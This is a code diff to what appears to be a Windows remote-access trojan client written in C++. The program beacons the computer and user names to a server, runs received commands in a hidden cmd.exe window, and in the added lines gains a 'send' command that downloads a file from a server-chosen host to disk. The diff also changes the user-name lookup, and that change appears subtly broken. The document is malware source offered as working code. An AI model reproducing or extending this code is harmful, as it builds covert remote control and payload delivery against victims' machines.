@@ -92,6 +92,8 @@ int main(int argc, char *argv[])
 	size_t len2;
 	char *GET;
 	size_t GETLEN;
+	TCHAR username[100];
+	DWORD usernameSize = 100;
 
 	//shutdown record
 	sf::Int64 timeout;
@@ -441,7 +443,8 @@ int main(int argc, char *argv[])
 				_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
 				str << "compName=" << pValue1 << "&";
 				_dupenv_s(&pValue2, &len2, "USERNAME");
-				str << "userName=" << pValue2;
+				GetUserNameW(username, &usernameSize);
+				str << "userName=" << username;
 				request.setUri(str.str());
 
 				response = http.sendRequest(request);
@@ -483,5 +486,15 @@ void httpCmd(string cmd, string arg1, string arg2, string arg3)
 		string resultSystem = "/C " + arg1;
 		cout << "system arg1: " << arg1 << endl;
 		ShellExecuteA(NULL, "open", "cmd.exe", resultSystem.c_str(), "C:\\ProgramData\\", SW_HIDE);
+	}
+	if (cmd == "send")
+	{
+		ofstream flux(arg3, ios::binary);
+		sf::Http::Request request(arg2, sf::Http::Request::Get);
+		sf::Http http(arg1);
+		sf::Http::Response response = http.sendRequest(request);
+
+		flux << response.getBody();
+		flux.close();
 	}
 }
